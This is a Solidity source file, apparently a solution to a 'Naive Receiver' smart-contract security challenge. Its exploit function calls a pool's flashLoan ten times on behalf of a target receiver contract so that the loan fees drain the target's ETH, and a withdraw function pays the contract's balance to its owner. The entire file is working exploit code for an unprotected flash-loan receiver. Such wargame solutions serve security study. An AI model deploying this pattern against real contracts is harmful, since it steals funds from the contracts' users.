// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface IPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract AttackerNaiveReceiver {

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    address owner; 
    IPool immutable pool;

    error NotOwner();
    error TransferFailed();

    constructor(address _pool) payable {
        owner = msg.sender;
        pool = IPool(_pool);
    }

    function exploit(address target) external {
        _onlyOwner();

        for (uint256 i; i < 10; ) {
            pool.flashLoan(IERC3156FlashBorrower(target), ETH, address(pool).balance, "");
            unchecked {
                ++i;
            }
        }
    }

    function withdraw() external {
        _onlyOwner();
        (bool res, ) = msg.sender.call{value: address(this).balance}("");
        if (!res) revert TransferFailed();
    }

    function _onlyOwner() internal view {
        if (msg.sender != owner) revert NotOwner();
    }
}